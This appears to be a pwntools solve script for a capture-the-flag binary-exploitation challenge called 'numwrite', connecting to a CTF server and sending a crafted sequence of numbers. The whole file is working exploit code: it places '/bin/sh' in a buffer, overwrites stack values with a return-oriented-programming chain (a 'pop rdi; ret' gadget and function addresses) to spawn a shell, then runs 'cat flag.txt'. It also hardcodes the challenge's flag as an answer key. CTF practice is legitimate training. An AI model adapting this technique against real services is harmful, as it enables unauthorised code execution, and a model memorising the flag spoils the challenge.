#!/usr/bin/env python3

from pwn import *
import sys, os

#context.log_level = 'debug'

NUMWRITE_FLAG = b"magpie{th3_w0rd_0f_7h3_d4y_|s_b1n4ry_3xpL0iT4t10n}"

def solve():
    # start the process with the arguments
    #p = process(["./numwrite"], timeout = 4, stdin = PTY, stdout = PTY, raw = False)
    #p = remote("localhost", 8754)
    p = remote("bin.magpiectf.ca", 8754)


    # receive the first line, print it out
    line = p.recvline()
    p.sendline("12AA/bin/sh")

    # receive the next input line
    line = p.recvuntil(b': long')
    p.sendline("i")

    # write 11 values
    for i in range(11):
        line = p.recvuntil(b':')
        p.sendline("-")

    # overwrite 12th value with the number 24 (0x18 in hex): 0x1800000000 = 103079215104
    line = p.recvuntil(b':')
    p.sendline("103079215104")

    # write 9 more values, use "-" to keep current memory
    # untouched
    for i in range(9):
        line = p.recvuntil(b':')
        p.sendline("-")

    # write ROPgadget for pop rdi; ret;  at 0x401743 = 4200259
    line = p.recvuntil(b':')
    p.sendline("4200259")

    # addr of /bin/sh whic is currently being held in the buffer because
    # atoi only uses the first numbers it finds: 0x4040b4 = 4210868
    line = p.recvuntil(b':')
    p.sendline("4210868")

    # write addr of write_numbers 0x401256 = 4198998
    line = p.recvuntil(b':')
    p.sendline("4198998")

    p.clean()

    p.sendline("cat flag.txt")
    
    flag = p.recvuntil(b'}')
    print(flag)

    return(flag == NUMWRITE_FLAG)